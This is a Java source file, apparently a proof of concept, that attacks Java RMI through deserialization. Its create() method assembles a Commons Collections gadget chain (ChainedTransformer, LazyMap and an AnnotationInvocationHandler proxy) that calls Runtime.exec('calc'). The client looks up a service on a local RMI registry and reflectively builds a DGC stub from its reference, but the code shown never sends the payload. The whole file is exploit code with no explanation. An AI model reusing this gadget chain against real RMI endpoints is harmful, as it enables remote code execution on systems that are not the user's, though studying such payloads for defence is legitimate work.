package org.trganda.client;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.trganda.remote.RemoteService;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.DGCImpl_Stub;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.TransportConstants;

import javax.net.SocketFactory;
import java.io.*;
import java.lang.reflect.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.util.HashMap;
import java.util.Map;

public class EvilRMIClient2ServerDGC {

    public Object create() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, new Object[]{"calc"})
        });

        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);

        Constructor annotationInvocationHandler =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
                        getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandler.setAccessible(true);
        InvocationHandler annoHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, lazyMap);

        Map map = (Map) Proxy.
                newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annoHandler);

        InvocationHandler anotherHandler = (InvocationHandler) annotationInvocationHandler.
                newInstance(Override.class, map);

        return anotherHandler;
    }

    public void callRemote(String name) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        RemoteService rs = (RemoteService) registry.lookup(name);

        try {
            Field h = rs.getClass().getSuperclass().getDeclaredField("h");
            h.setAccessible(true);
            InvocationHandler handler = (InvocationHandler) h.get(rs);

            Field ref = handler.getClass().getSuperclass().getDeclaredField("ref");
            ref.setAccessible(true);
            UnicastRef unicastRef = (UnicastRef) ref.get(handler);

            Class dgcStub = Class.forName("sun.rmi.transport.DGCImpl_Stub");
            Constructor dgcC = dgcStub.getConstructor(RemoteRef.class);
            DGCImpl_Stub stub = (DGCImpl_Stub) dgcC.newInstance(unicastRef);

        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            EvilRMIClient2ServerDGC rc = new EvilRMIClient2ServerDGC();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
